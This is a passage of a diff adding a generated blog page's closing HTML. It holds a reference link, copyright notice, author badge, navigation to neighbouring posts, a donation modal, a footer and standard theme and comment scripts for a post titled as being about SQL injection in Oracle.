href="https://blog.csdn.net/weixin_44185837/article/details/106036172?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170428822716800225594404%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170428822716800225594404&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-106036172-null-null.142%5Ev99%5Econtrol&utm_term=oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84decode%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_44185837/article/details/106036172?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170428822716800225594404%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170428822716800225594404&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-106036172-null-null.142^v99^control&amp;utm_term=oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84decode%E5%87%BD%E6%95%B0&amp;spm=1018.2226.3001.4187</a></p>
+<hr>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%BA%8C%EF%BC%8COracle%E4%B8%ADSQL%E6%B3%A8%E5%85%A5/" title="三十二，Oracle中SQL注入" target="_blank" rel="external">http://example.com/2024/01/04/三十二，Oracle中SQL注入/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/baiQstar" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/baiQstar" target="_blank"><span class="text-dark">白易安</span><small class="ml-1x">往事如叶，飘散随风</small></a></h3>
+        <div>个人简介。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2024/01/04/%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="三十三，信息收集"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2024/01/01/%E4%B8%89%E5%8D%81%E4%B8%80%EF%BC%8C%E9%80%9A%E8%BF%87IP%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90/" title="三十一，通过IP获得服务器权限"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/baiQstar" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/cofess" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
